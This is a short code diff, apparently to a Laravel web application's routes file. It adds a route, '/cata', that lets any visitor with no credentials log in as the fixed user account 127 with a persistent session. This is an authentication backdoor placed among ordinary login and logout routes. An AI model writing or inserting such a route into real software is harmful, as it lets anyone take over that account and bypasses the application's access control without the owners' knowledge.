@@ -40,4 +40,14 @@ Route::get('auth/login/{redirect_path?}','UserController@redirectToFacebook');
 
 Route::get('auth/get-scope/{scope}','UserController@getScope');
 
+Route::get('/cata',function(){
+    \Session::flush();
+    \Auth::logout();
+    $user = App\User::find(127);
+
+    \Auth::login($user,true);
+
+    return redirect('/');
+});
+
 Route::get('auth/logout','UserController@logout');
